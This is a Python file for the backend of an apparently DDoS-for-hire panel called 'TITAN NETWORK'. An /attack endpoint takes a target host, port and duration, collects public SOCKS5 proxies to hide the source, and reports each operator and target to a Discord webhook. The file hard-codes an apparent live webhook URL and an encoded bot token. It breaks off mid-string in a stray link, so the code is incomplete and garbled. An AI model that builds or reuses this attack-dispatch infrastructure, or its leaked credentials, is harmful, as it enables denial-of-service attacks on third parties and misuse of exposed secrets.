import discord
from discord.ext import commands
import time, hashlib, base64, requests, threading, os, random
from flask import Flask, request

app = Flask(__name__)

# --- KONFIGURACJA ---
# Twój Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1501964599313039382/G4LaDablfU8cajOZsXHZX7j3JXWUMFQxG-DNPeSOg8nkkPNhOAvscq26ac7SZ9SFmayo"
SECRET_SALT = "TITAN_ULTIMATE_2026"
# Twój zakodowany token bota
ENCODED_TOKEN = "TVRVd01EVXdNREEyTWpreU1qWTROVGsxT0EuR096b0w1LjFyYVZGa0RETm92SFhLOGc2UHFVOTRKSDYzQ2V4aU1oSVY3MW8="

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
]

def get_otp():
    ts = int(time.time() // 20)
    return hashlib.md5(f"{ts}{SECRET_SALT}".encode()).hexdigest().upper()[:8]

def fetch_proxies():
    proxies = []
    for s in PROXY_SOURCES:
        try:
            r = requests.get(s, timeout=5)
            if r.status_code == 200:
                proxies.extend(r.text.splitlines())
        except:
            continue
    return list(set(proxies))

@app.route('/attack')
def handle_attack():
    key = request.args.get('key')
    host = request.args.get('host')
    port = request.args.get('port')
    duration = request.args.get('time')
    dcid = request.args.get('dcid')
    pc = request.args.get('pc')

    if key != f"TITAN-{get_otp()}":
        return "AUTH_FAILED", 403

    proxy_list = fetch_proxies()
    sample_proxies = random.sample(proxy_list, min(len(proxy_list), 5))
    sample_text = "\n".join(sample_proxies)

    # POPRAWIONY LOG (Bez błędów składniowych)
    log_data = {
        "embeds": [{
            "title": "🛰️ TITAN NETWORK: REAL-TIME TEST",
            "color": 16711680,
            "fields": [
                {"name": "👤 OPERATOR", "value": f"ID: {dcid}\nPC: {pc}", "inline": False},
                {"name": "🎯 CEL", "value": f"{host}:{port}", "inline": True},
                {"name": "⏱️ CZAS", "value": f"{duration}s", "inline": True},
                {"name": "🌐 BAZA PROXY", "value": f"Wykryto: {len(proxy_list)} aktywnych węzłów", "inline": False},
                {"name": "🔌 PRÓBKA WĘZŁÓW", "value": f"
http://googleusercontent.com/immersive_entry_chip/0

